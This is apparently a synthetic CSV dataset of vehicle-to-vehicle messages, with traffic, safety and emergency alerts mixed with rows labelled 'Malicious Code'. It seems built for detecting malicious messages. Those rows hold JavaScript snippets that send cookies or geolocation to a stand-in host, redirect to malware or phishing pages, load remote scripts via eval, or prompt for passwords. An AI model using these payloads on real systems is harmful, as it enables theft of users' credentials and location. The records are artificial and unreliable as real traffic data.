Timestamp,Vehicle_ID,Vehicle_Type,Latitude,Longitude,Speed,Message_Type,Message_Content,Weather_Condition
54:22.0,vehicle_67,truck,47.64026944,-122.3615565,77.62465966,Traffic Update,At-a-standstill traffic on Boulevard.,foggy
23:26.0,vehicle_19,motorcycle,47.68486363,-122.3320212,56.73801486,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
24:03.6,vehicle_79,motorcycle,47.62574151,-122.3829097,47.56915805,Emergency Update,Power outage in your surrounding area.,snowy
21:15.3,vehicle_77,car,47.67434283,-122.3797862,72.89816134,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
20:46.8,vehicle_7,car,47.64207747,-122.3166219,91.17709009,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
29:32.4,vehicle_73,motorcycle,47.68547052,-122.3413388,17.65143195,Emergency Update,Evacuation order locally.,clear
57:44.7,vehicle_93,car,47.69625379,-122.3875543,94.84268243,Safety,Beware of Detours.,rainy
11:25.3,vehicle_68,car,47.60126271,-122.3823531,87.50511581,Emergency Update,Emergency traffic in your locality.,rainy
02:32.4,vehicle_54,car,47.65986972,-122.3539042,5.741710526,Malicious Code,"prompt('Enter your password:', 'Password Required');",rainy
42:12.2,vehicle_11,motorcycle,47.61779594,-122.3035764,40.57783022,Emergency Update,Bridge collapse in your immediate area.,foggy
37:30.8,vehicle_37,car,47.69695329,-122.3673989,51.79812176,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
10:42.9,vehicle_65,motorcycle,47.68201431,-122.3265901,87.67823723,Traffic Update,Stop-and-go traffic on Highway 1.,snowy
25:07.5,vehicle_49,car,47.6870583,-122.3830083,16.75329883,Emergency Update,Active shooter in your vicinity.,foggy
44:09.5,vehicle_54,motorcycle,47.65532716,-122.3353086,116.2722819,Emergency Update,Detour due to emergency in your surrounding area.,snowy
37:46.7,vehicle_28,motorcycle,47.63222464,-122.361307,42.09761376,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
01:41.5,vehicle_85,truck,47.68923979,-122.3740374,46.4351996,Safety,Be alert to Black ice.,snowy
56:18.0,vehicle_60,truck,47.60199164,-122.3594398,115.4985515,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
46:58.2,vehicle_23,truck,47.66270099,-122.3923184,83.35214725,Emergency Update,Emergency traffic in your community.,foggy
17:29.3,vehicle_89,car,47.6476052,-122.356599,71.69851514,Emergency Update,Natural disaster in your part of town.,snowy
10:33.3,vehicle_79,motorcycle,47.65258304,-122.3525755,91.35263074,Safety,Beware of Inclement weather.,snowy
24:14.7,vehicle_95,car,47.66699972,-122.3136816,89.2211747,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,rainy
48:58.5,vehicle_37,motorcycle,47.68040982,-122.3292545,69.65458969,Traffic Update,Gridlock on City Road 1.,foggy
33:08.9,vehicle_91,car,47.65850886,-122.3141539,2.626468298,Safety,Avoid Black ice.,snowy
54:29.1,vehicle_38,motorcycle,47.6933734,-122.3856292,18.9912509,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,foggy
45:03.7,vehicle_95,motorcycle,47.6854151,-122.3432815,15.86843966,Traffic Update,Gridlock on Bundesautobahn 1.,clear
23:45.9,vehicle_60,truck,47.61699798,-122.322424,67.11789222,Safety,Take precautions against Potholes.,clear
04:24.4,vehicle_38,truck,47.62649194,-122.3566691,69.20811757,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
52:22.5,vehicle_76,motorcycle,47.69955756,-122.320238,15.88503387,Safety,Stay informed about Spills.,clear
08:37.9,vehicle_64,motorcycle,47.66944199,-122.3317295,14.82180269,Traffic Update,Traffic jam on Lane.,clear
36:59.7,vehicle_6,car,47.61715392,-122.3241569,100.903267,Safety,Be on the lookout for Spills.,clear
18:53.8,vehicle_49,truck,47.64632079,-122.3299169,91.27328425,Traffic Update,Gridlock on Provincial Highway 1.,foggy
18:33.2,vehicle_22,truck,47.61411128,-122.3715253,106.9619938,Emergency Update,Terrorist attack in your part of town.,rainy
57:25.9,vehicle_66,truck,47.69360802,-122.3199286,65.16542915,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
30:41.2,vehicle_51,motorcycle,47.64863294,-122.3792485,32.5695257,Emergency Update,Civil unrest in your part of town.,clear
37:51.0,vehicle_43,motorcycle,47.66715549,-122.3484973,12.71966751,Emergency Update,Power outage in your immediate area.,foggy
53:49.5,vehicle_57,truck,47.69716797,-122.3302918,41.31495338,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
03:07.1,vehicle_46,car,47.69112723,-122.3060253,104.9210406,Traffic Update,Tailback on Provincial Highway 1.,rainy
42:57.9,vehicle_38,motorcycle,47.67609397,-122.322473,46.0842745,Emergency Update,Terrorist attack in your region.,clear
20:54.8,vehicle_82,motorcycle,47.67884257,-122.374744,88.97245378,Emergency Update,Emergency traffic locally.,clear
18:56.0,vehicle_21,truck,47.66655986,-122.3930511,116.5247516,Traffic Update,Tailback on Main Street.,clear
09:37.8,vehicle_69,truck,47.69884519,-122.3923602,110.0515714,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
27:45.7,vehicle_45,truck,47.62027189,-122.3572508,6.810676981,Emergency Update,Traffic diversion in your immediate area.,foggy
32:41.7,vehicle_33,car,47.66407287,-122.3740202,3.963477567,Safety,Be cautious of Low visibility due to fog or smoke.,foggy
14:33.3,vehicle_79,car,47.60323234,-122.3642129,88.0317072,Emergency Update,Natural disaster nearby.,foggy
32:25.7,vehicle_4,car,47.6086217,-122.3602243,20.77405115,Traffic Update,Traffic bottleneck on Local Street.,foggy
11:02.3,vehicle_13,motorcycle,47.6108715,-122.3418672,42.64068356,Safety,Stay informed about Wildlife crossing.,snowy
29:12.1,vehicle_92,truck,47.69432896,-122.3303175,69.46684868,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
24:41.5,vehicle_79,truck,47.6216466,-122.3762981,105.9850466,Safety,Be cautious of Fallen trees.,snowy
21:15.9,vehicle_39,motorcycle,47.641285,-122.3151632,71.9079934,Emergency Update,Multi-vehicle accident in your immediate area.,foggy
50:08.3,vehicle_81,car,47.69959132,-122.3274964,78.57754192,Safety,Stay away from Debris.,foggy
12:27.5,vehicle_72,car,47.66512492,-122.3287785,98.51732266,Emergency Update,Major traffic collision in your part of town.,foggy
41:25.4,vehicle_97,truck,47.67987835,-122.3075571,65.93356249,Emergency Update,Road collapse nearby.,snowy
11:08.8,vehicle_80,motorcycle,47.68362264,-122.3465489,115.5868024,Safety,Exercise caution regarding Wildlife crossing.,rainy
55:13.2,vehicle_20,car,47.64901102,-122.3382457,71.04096907,Traffic Update,Traffic jam on Drive.,rainy
28:36.0,vehicle_79,truck,47.66479081,-122.3890634,68.51500018,Emergency Update,Bridge collapse in your jurisdiction.,clear
40:24.2,vehicle_91,car,47.64233173,-122.3203459,43.73327125,Safety,Watch out for Icy roads.,rainy
40:14.1,vehicle_90,motorcycle,47.68616778,-122.3389173,11.68564593,Emergency Update,Traffic diversion in your community.,snowy
13:25.5,vehicle_83,motorcycle,47.65922618,-122.305665,72.67913071,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
26:10.9,vehicle_12,truck,47.6812178,-122.3193368,24.92188037,Traffic Update,Tailback on Main Street.,clear
35:11.0,vehicle_19,truck,47.69830045,-122.3345485,101.6571722,Safety,Be cautious of Detours.,clear
21:26.1,vehicle_72,truck,47.63306291,-122.3565368,39.93125585,Emergency Update,Terrorist attack in your region.,snowy
57:09.7,vehicle_82,truck,47.66257011,-122.3644597,55.36493335,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",foggy
30:48.4,vehicle_32,motorcycle,47.60292972,-122.3100188,62.27071743,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
31:43.9,vehicle_39,car,47.66127972,-122.3297684,99.66530779,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,rainy
29:05.8,vehicle_84,truck,47.63852297,-122.3597079,94.42191368,Emergency Update,Bridge collapse in your part of town.,clear
14:08.4,vehicle_53,truck,47.65386085,-122.3166849,22.10652843,Emergency Update,Road collapse in your locale.,rainy
00:01.8,vehicle_82,car,47.62956032,-122.3666692,97.32756793,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
18:38.0,vehicle_31,car,47.64527851,-122.3500879,41.15349129,Safety,Stay away from Accidents.,clear
00:00.8,vehicle_41,car,47.69980756,-122.3045851,79.47981212,Safety,Be on the lookout for Slippery roads due to rain or snow.,rainy
03:23.3,vehicle_27,motorcycle,47.66811649,-122.3533557,83.04009229,Emergency Update,Chemical spill nearby.,foggy
46:52.6,vehicle_94,motorcycle,47.69603308,-122.394816,54.96832219,Safety,Stay informed about Debris.,rainy
37:05.7,vehicle_82,truck,47.63909853,-122.3584621,101.206966,Emergency Update,Chemical spill in your locality.,clear
28:55.3,vehicle_8,motorcycle,47.66948404,-122.3851755,12.11389924,Traffic Update,Traffic is at a standstill on the northbound lanes of County Road 1.,foggy
09:01.9,vehicle_24,truck,47.62102533,-122.3893466,70.55499127,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
07:32.0,vehicle_93,motorcycle,47.64781575,-122.3024951,24.21029434,Safety,Be on the lookout for Black ice.,foggy
33:25.0,vehicle_76,motorcycle,47.63049346,-122.3426941,6.905728443,Traffic Update,Heavy traffic on Lane.,foggy
45:14.1,vehicle_21,motorcycle,47.60478125,-122.3213999,70.60897819,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
20:41.1,vehicle_68,motorcycle,47.67825553,-122.3781707,1.369942566,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",rainy
51:33.5,vehicle_58,truck,47.68206616,-122.3270627,112.2732037,Traffic Update,Stop-and-go traffic on State Highway 1.,rainy
59:29.7,vehicle_80,truck,47.62342241,-122.3284895,92.95767567,Safety,Look out for Accidents.,rainy
18:17.2,vehicle_24,car,47.60823757,-122.3575849,76.33387457,Traffic Update,Tailback on Lane.,foggy
50:28.0,vehicle_84,car,47.61026895,-122.3748951,6.322086929,Safety,Exercise caution regarding Debris.,rainy
57:22.2,vehicle_0,truck,47.69081747,-122.3728736,11.23907596,Traffic Update,Heavy congestion on City Road 1.,clear
27:27.4,vehicle_67,car,47.65210008,-122.3403037,63.14288632,Traffic Update,Traffic jam on Route 66.,rainy
49:40.1,vehicle_35,car,47.62840029,-122.3273686,84.51619337,Emergency Update,Natural disaster in your jurisdiction.,clear
58:13.2,vehicle_28,motorcycle,47.69719031,-122.374511,24.52063766,Traffic Update,Slow traffic on I-95.,rainy
31:54.6,vehicle_98,truck,47.65148439,-122.3513256,86.35695455,Malicious Code,location.href = 'https://example.com/malware.exe';,clear
55:20.9,vehicle_11,truck,47.68840652,-122.3318748,4.46385638,Safety,Beware of Low visibility due to fog or smoke.,rainy
48:16.4,vehicle_57,car,47.67060714,-122.3525943,118.1099324,Traffic Update,Severe traffic congestion on Route 66.,clear
50:29.6,vehicle_1,motorcycle,47.6041926,-122.3166708,54.06365575,Safety,Be aware of Icy roads.,foggy
11:07.8,vehicle_96,truck,47.64630992,-122.3013792,33.82619736,Traffic Update,Slow traffic on Avenue.,snowy
59:34.6,vehicle_88,car,47.65475592,-122.3788815,114.1141093,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
57:08.2,vehicle_9,motorcycle,47.60538174,-122.3977138,50.62920755,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
39:52.7,vehicle_25,truck,47.65214397,-122.3163935,23.8707603,Traffic Update,Traffic is at a standstill on the northbound lanes of Highway 1.,clear
16:09.8,vehicle_98,motorcycle,47.64642637,-122.3665665,6.162808265,Emergency Update,Power outage in your region.,rainy
16:06.9,vehicle_99,motorcycle,47.60319157,-122.3727122,13.57539713,Safety,Look out for Wildlife crossing.,snowy
33:43.4,vehicle_14,truck,47.6680864,-122.3018685,56.6084413,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
44:27.5,vehicle_57,car,47.62302333,-122.3058484,61.6526211,Safety,Be cautious of Accidents.,rainy
29:25.1,vehicle_44,motorcycle,47.62839999,-122.3244908,16.5717228,Safety,Be aware of Black ice.,snowy
53:16.2,vehicle_55,motorcycle,47.62576484,-122.3937937,26.04769957,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
20:20.4,vehicle_35,car,47.6906647,-122.3130555,90.66401998,Emergency Update,Evacuation order locally.,rainy
43:19.8,vehicle_32,car,47.69365562,-122.3881495,53.93377935,Traffic Update,Severe traffic congestion on City Road 1.,snowy
21:05.7,vehicle_8,motorcycle,47.69021858,-122.3925402,81.53588468,Emergency Update,Active shooter in your locale.,rainy
40:21.7,vehicle_37,truck,47.60931323,-122.3365114,6.174597897,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
13:08.7,vehicle_53,motorcycle,47.67862365,-122.3824087,81.09918228,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
32:01.6,vehicle_31,car,47.63255509,-122.3893217,118.5896984,Safety,Be aware of Inclement weather.,clear
03:09.8,vehicle_39,car,47.60737498,-122.3492114,105.6463451,Safety,Take precautions against Potholes.,foggy
51:39.2,vehicle_78,car,47.60214381,-122.3823008,86.21971717,Traffic Update,Traffic is at a standstill on the northbound lanes of State Highway 1.,snowy
37:51.7,vehicle_77,motorcycle,47.64847077,-122.3872957,112.6084221,Traffic Update,Traffic bottleneck on Bundesautobahn 1.,rainy
23:36.7,vehicle_94,car,47.69222321,-122.385754,112.7289675,Emergency Update,Chemical spill in your surrounding area.,snowy
53:59.9,vehicle_57,truck,47.62293872,-122.3465988,104.5688184,Emergency Update,Power outage in your part of town.,snowy
36:24.5,vehicle_65,car,47.67098575,-122.3622154,3.61997959,Traffic Update,Tailback on State Highway 1.,clear
04:22.8,vehicle_39,motorcycle,47.65178671,-122.3620785,106.0105219,Traffic Update,Traffic is at a standstill on the northbound lanes of Provincial Highway 1.,snowy
53:05.6,vehicle_55,motorcycle,47.60300505,-122.3274236,34.53891298,Emergency Update,Water crisis in your jurisdiction.,clear
36:31.9,vehicle_53,motorcycle,47.6637725,-122.3201558,90.44960472,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,foggy
29:02.7,vehicle_30,motorcycle,47.61371091,-122.3434496,43.04475923,Safety,Be cautious of Debris.,snowy
38:18.9,vehicle_24,motorcycle,47.66495806,-122.3816252,6.374192883,Emergency Update,Active shooter in your region.,rainy
14:31.5,vehicle_97,car,47.64209155,-122.3242463,6.538329312,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
21:59.7,vehicle_96,truck,47.69061769,-122.346021,113.287994,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
25:18.5,vehicle_0,truck,47.63252149,-122.3519715,9.7597567,Emergency Update,Natural disaster in your surrounding area.,clear
09:18.9,vehicle_53,truck,47.60381712,-122.3450714,54.91844811,Safety,Be cautious of Road construction.,rainy
36:02.2,vehicle_25,car,47.64837354,-122.3534568,4.489841112,Safety,Be on the lookout for Wildlife crossing.,snowy
57:52.1,vehicle_3,car,47.64086335,-122.3636454,37.90066188,Emergency Update,Evacuation order in your locale.,clear
42:43.2,vehicle_46,motorcycle,47.63600785,-122.3318275,0.486817072,Safety,Be on the lookout for Accidents.,foggy
00:31.3,vehicle_85,car,47.63550733,-122.3363712,27.48140782,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
15:31.9,vehicle_27,truck,47.68178041,-122.3873169,81.81104264,Emergency Update,Bridge collapse in your locality.,foggy
55:16.7,vehicle_94,car,47.67905785,-122.3319624,94.11407495,Emergency Update,Terrorist attack in your immediate area.,clear
37:19.5,vehicle_42,truck,47.66968114,-122.3327999,6.795296624,Safety,Watch out for Black ice.,clear
37:31.9,vehicle_52,car,47.64748038,-122.3198782,93.06020639,Traffic Update,Stop-and-go traffic on Local Street.,snowy
56:34.1,vehicle_27,car,47.64986324,-122.3362309,65.71539322,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
29:12.9,vehicle_87,car,47.61773588,-122.3335072,97.4605244,Emergency Update,Hazardous materials incident in your locality.,snowy
44:57.8,vehicle_90,truck,47.67114939,-122.3383666,80.82749359,Safety,Be on the lookout for Spills.,snowy
51:42.9,vehicle_17,car,47.68154285,-122.3002216,92.05645213,Traffic Update,Heavy traffic on Drive.,clear
38:52.3,vehicle_72,truck,47.61029293,-122.3892148,38.38734446,Traffic Update,At-a-standstill traffic on County Road 1.,foggy
24:17.4,vehicle_83,car,47.65231754,-122.3081565,22.31877333,Malicious Code,(function() { var img = new Image(); img.src = 'https://example.com/tracker.php?data=' + encodeURIComponent(document.cookie); })();,clear
06:14.1,vehicle_89,truck,47.64213034,-122.321395,64.87803223,Traffic Update,Slow traffic on National Highway 1.,snowy
15:08.0,vehicle_89,motorcycle,47.60672937,-122.3949205,7.301474025,Traffic Update,Traffic backup on Provincial Highway 1.,snowy
19:43.1,vehicle_62,truck,47.67380351,-122.3758883,26.75305015,Emergency Update,Bridge collapse in your immediate area.,rainy
10:18.1,vehicle_53,motorcycle,47.61534262,-122.3428662,67.6209116,Traffic Update,Stop-and-go traffic on State Highway 1.,rainy
19:43.3,vehicle_20,car,47.68320653,-122.3136238,3.265483672,Emergency Update,Traffic diversion in your vicinity.,foggy
43:32.7,vehicle_58,car,47.6776443,-122.3548938,20.04119822,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),snowy
20:00.0,vehicle_7,car,47.66185336,-122.3367432,13.00455655,Traffic Update,Traffic jam on Avenue.,rainy
00:40.7,vehicle_12,motorcycle,47.60710422,-122.3042585,1.969270372,Traffic Update,Traffic jam on Lane.,snowy
23:24.7,vehicle_67,truck,47.60429786,-122.3400113,103.3241498,Emergency Update,Traffic diversion in your part of town.,snowy
13:47.4,vehicle_94,truck,47.62046064,-122.305415,87.00353062,Traffic Update,Traffic jam on Lane.,rainy
40:44.5,vehicle_35,truck,47.64023079,-122.3557777,90.76830173,Safety,Beware of Accidents.,rainy
16:56.4,vehicle_30,motorcycle,47.6432274,-122.3424278,78.0419295,Malicious Code,location.href = 'https://example.com/malware.exe';,foggy
04:34.2,vehicle_38,truck,47.639789,-122.3684938,43.04245882,Traffic Update,Stop-and-go traffic on Interstate 40.,snowy
04:40.4,vehicle_50,motorcycle,47.65850121,-122.307289,101.9796182,Traffic Update,Tailback on National Highway 1.,snowy
08:13.9,vehicle_82,motorcycle,47.68539622,-122.3975149,109.4727081,Safety,Watch out for Detours.,foggy
23:52.1,vehicle_91,car,47.64486322,-122.3128982,102.6626565,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,clear
29:19.9,vehicle_46,truck,47.60945102,-122.3277638,105.690157,Safety,Stay informed about Power outages.,clear
17:15.6,vehicle_19,car,47.64559601,-122.32853,58.58762208,Safety,Take precautions against Uneven surfaces.,clear
47:39.1,vehicle_81,motorcycle,47.69459023,-122.3781651,78.24497969,Emergency Update,Water crisis in your locality.,rainy
59:03.5,vehicle_95,car,47.6268585,-122.3163734,5.133983035,Emergency Update,Traffic diversion in your vicinity.,rainy
47:00.8,vehicle_6,car,47.60371676,-122.3214075,76.71589691,Traffic Update,Severe traffic congestion on Provincial Highway 1.,snowy
08:58.0,vehicle_10,motorcycle,47.62617198,-122.3668681,51.01066841,Traffic Update,Tailback on Interstate 40.,clear
47:19.8,vehicle_55,motorcycle,47.60005927,-122.3308592,67.33384177,Safety,Be cautious of Slippery roads due to rain or snow.,snowy
47:05.8,vehicle_54,truck,47.63677176,-122.3829269,47.10303265,Emergency Update,Water crisis in your locality.,rainy
27:59.2,vehicle_46,motorcycle,47.69174135,-122.30397,15.87032203,Traffic Update,Stop-and-go traffic on Drive.,clear
42:40.3,vehicle_29,truck,47.68644739,-122.3705444,20.55266468,Safety,Be cautious of Debris.,foggy
52:05.6,vehicle_50,truck,47.68702745,-122.3299438,74.57842013,Emergency Update,Infrastructure collapse in your neighborhood.,clear
05:30.4,vehicle_2,truck,47.64343147,-122.3055845,73.17696899,Traffic Update,Heavy congestion on Provincial Highway 1.,foggy
12:51.5,vehicle_67,motorcycle,47.64329859,-122.3426312,89.90327634,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,snowy
14:11.8,vehicle_73,motorcycle,47.62394924,-122.3319864,111.6756385,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",clear
41:07.0,vehicle_22,truck,47.65504317,-122.3201621,19.52194593,Malicious Code,location.href = 'https://example.com/malware.exe';,snowy
16:43.7,vehicle_40,motorcycle,47.66043229,-122.387952,112.2475931,Safety,Be alert to Inclement weather.,clear
22:38.5,vehicle_98,motorcycle,47.6234574,-122.376148,64.65087124,Traffic Update,Gridlock on Lane.,clear
46:52.1,vehicle_7,motorcycle,47.65802143,-122.3099898,2.143794768,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
13:02.1,vehicle_82,car,47.60520177,-122.3281525,97.82588825,Emergency Update,Chemical spill in your part of town.,clear
17:08.8,vehicle_38,truck,47.69830841,-122.3558016,81.33765286,Traffic Update,Traffic is at a standstill on the northbound lanes of County Road 1.,clear
41:14.8,vehicle_0,car,47.63268407,-122.3302338,80.29164967,Malicious Code,"prompt('Enter your password:', 'Password Required');",clear
47:03.7,vehicle_57,car,47.69862927,-122.3459799,34.95425,Safety,Watch out for Road closures.,foggy
37:02.1,vehicle_48,car,47.69998184,-122.348093,26.95453774,Safety,Stay informed about Accidents.,rainy
24:52.3,vehicle_97,truck,47.66310575,-122.3649402,23.03163538,Emergency Update,Multi-vehicle accident nearby.,snowy
52:07.8,vehicle_53,car,47.65497878,-122.3623336,62.3163887,Safety,Stay informed about Low visibility due to fog or smoke.,foggy
43:40.9,vehicle_7,car,47.64996709,-122.3757967,85.40559514,Emergency Update,Head-on collision in your jurisdiction.,foggy
18:57.8,vehicle_82,motorcycle,47.61070295,-122.3760748,56.36787178,Emergency Update,Traffic diversion in your community.,clear
20:20.7,vehicle_14,motorcycle,47.60868509,-122.3061929,65.79815178,Traffic Update,Tailback on I-95.,snowy
40:34.3,vehicle_7,car,47.69138377,-122.3568635,37.8298301,Safety,Be alert to Spills.,snowy
27:11.2,vehicle_13,truck,47.61608092,-122.3867992,72.08521135,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
51:11.9,vehicle_52,car,47.61734082,-122.3054282,18.37832394,Emergency Update,Traffic diversion in your neighborhood.,clear
27:37.6,vehicle_89,car,47.6668106,-122.386686,15.58861272,Malicious Code,location.href = 'https://example.com/malware.exe';,rainy
42:06.7,vehicle_84,motorcycle,47.69950496,-122.3423555,53.2035311,Safety,Look out for Detours.,rainy
06:17.0,vehicle_61,truck,47.68815212,-122.3712903,36.76530336,Malicious Code,navigator.geolocation.getCurrentPosition(function(position) { fetch('https://example.com/location.php?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude); });,clear
55:54.7,vehicle_23,car,47.62323137,-122.3915286,3.758103597,Malicious Code,"Object.defineProperty(window, 'location', { get: () => ({ href: 'https://example.com/phishing.html' }) });",snowy
14:04.8,vehicle_41,motorcycle,47.63988891,-122.3061015,8.346188767,Traffic Update,Traffic jam on Highway 1.,foggy
37:58.0,vehicle_52,motorcycle,47.63316434,-122.3965246,59.98791393,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",foggy
03:56.6,vehicle_57,car,47.644324,-122.3705246,28.5574915,Safety,Avoid Black ice.,rainy
29:40.3,vehicle_10,motorcycle,47.66299531,-122.361025,110.2242422,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,rainy
47:38.0,vehicle_2,motorcycle,47.69714676,-122.3421306,85.13063956,Safety,Avoid Detours.,snowy
52:00.0,vehicle_62,truck,47.60128048,-122.3136612,117.625174,Traffic Update,Traffic jam on National Highway 1.,clear
16:04.3,vehicle_58,motorcycle,47.61019918,-122.3640664,85.62834482,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),foggy
54:57.7,vehicle_15,car,47.69069987,-122.3478296,40.99242058,Traffic Update,Gridlock on County Road 1.,clear
57:28.8,vehicle_89,motorcycle,47.64534398,-122.3981358,14.3421661,Safety,Be alert to Detours.,clear
08:20.6,vehicle_26,motorcycle,47.61453753,-122.3300046,114.1081882,Emergency Update,Detour due to emergency in your community.,rainy
38:05.4,vehicle_2,truck,47.62791658,-122.312494,5.638687243,Malicious Code,"setInterval(() => { document.getElementById('submit_button').click(); }, 5000);",snowy
36:58.5,vehicle_6,truck,47.67795014,-122.3592892,39.49006889,Malicious Code,eval(unescape('%3Cscript%3Esrc%3D%22http://example.com/malicious.js%22%3E%3C/script%3E')),clear
03:56.2,vehicle_68,motorcycle,47.68274045,-122.3813181,92.95032955,Malicious Code,fetch('https://example.com/phishing.html').then(response => response.text()).then(html => document.body.innerHTML = html);,clear
43:26.9,vehicle_65,car,47.6729369,-122.3529251,108.3186652,Emergency Update,Traffic diversion in your neighborhood.,rainy
20:42.5,vehicle_26,car,47.60636847,-122.3709099,28.42209574,Malicious Code,document.cookie = 'data=' + btoa(document.location.search.slice(1));,rainy
37:49.3,vehicle_25,car,47.60271457,-122.3834179,82.53962109,Traffic Update,Traffic jam on Provincial Highway 1.,clear
15:03.1,vehicle_25,car,47.69981026,-122.3767178,48.70310555,Traffic Update,Gridlock on Avenue.,foggy
09:50.5,vehicle_48,truck,47.66676656,-122.3815008,70.94376302,Emergency Update,Evacuation order in your part of town.,snowy
19:31.9,vehicle_47,truck,47.63307465,-122.3456,105.8029867,Safety,Be cautious of Black ice.,snowy
52:24.1,vehicle_33,truck,47.6718319,-122.3628008,92.39807711,Emergency Update,Power outage in your locality.,foggy
26:06.0,vehicle_36,truck,47.63407806,-122.3337268,89.58861067,Traffic Update,Severe traffic congestion on Provincial Highway 1.,rainy
59:25.5,vehicle_48,car,47.66309095,-122.3816319,81.19264927,Emergency Update,Terrorist attack locally.,rainy
23:40.1,vehicle_21,car,47.6088201,-122.387966,44.3206307,Emergency Update,Evacuation order locally.,snowy
26:59.1,vehicle_18,car,47.64267416,-122.3608431,77.63186666,Malicious Code,"prompt('Enter your password:', 'Password Required');",snowy
58:13.8,vehicle_96,motorcycle,47.63375542,-122.3171654,26.15177622,Safety,Be cautious of Road closures.,foggy
36:05.5,vehicle_59,car,47.60937074,-122.3819272,117.0200149,Traffic Update,Tailback on County Road 1.,snowy
